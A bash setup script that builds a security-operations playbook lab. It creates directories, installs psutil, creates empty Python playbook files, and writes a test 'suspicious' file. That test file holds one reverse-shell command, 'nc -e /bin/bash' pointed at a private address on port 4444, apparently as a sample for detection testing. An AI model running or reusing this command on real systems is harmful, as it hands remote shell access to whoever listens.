#!/bin/bash


# Create project structure

mkdir -p ~/soc_playbooks/{scripts,logs,config,evidence}
cd ~/soc_playbooks
mkdir -p logs/{incidents,alerts,reports}

echo "Directory structure created."

# Install required Python libraries

echo "Installing Python dependencies..."
pip3 install psutil

# Create base playbook file

touch scripts/base_playbook.py

# Create malware detection playbook

touch scripts/malware_detection.py

# Create network intrusion playbook

touch scripts/network_intrusion.py

# Create system isolation playbook

touch scripts/system_isolation.py

# Make scripts executable

chmod +x scripts/base_playbook.py
chmod +x scripts/malware_detection.py
chmod +x scripts/network_intrusion.py
chmod +x scripts/system_isolation.py

echo "Playbook scripts created and permissions set."

# Create test suspicious file

echo "Creating test suspicious file..."
echo '#!/bin/bash' > /tmp/test_suspicious.sh
echo 'nc -e /bin/bash 192.168.1.100 4444' >> /tmp/test_suspicious.sh
chmod +x /tmp/test_suspicious.sh

echo "Test suspicious file created at /tmp/test_suspicious.sh"

echo "======================================="
echo "SOC PLAYBOOK ENVIRONMENT READY"
echo "======================================="
echo ""
echo "Run Malware Detection:"
echo "python3 ~/soc_playbooks/scripts/malware_detection.py"
echo ""
echo "Run Network Intrusion Detection:"
echo "python3 ~/soc_playbooks/scripts/network_intrusion.py"
echo ""
echo "Run System Isolation (Test Environment Only):"
echo "python3 ~/soc_playbooks/scripts/system_isolation.py"
echo ""
echo "Logs directory:"
echo "~/soc_playbooks/logs/"
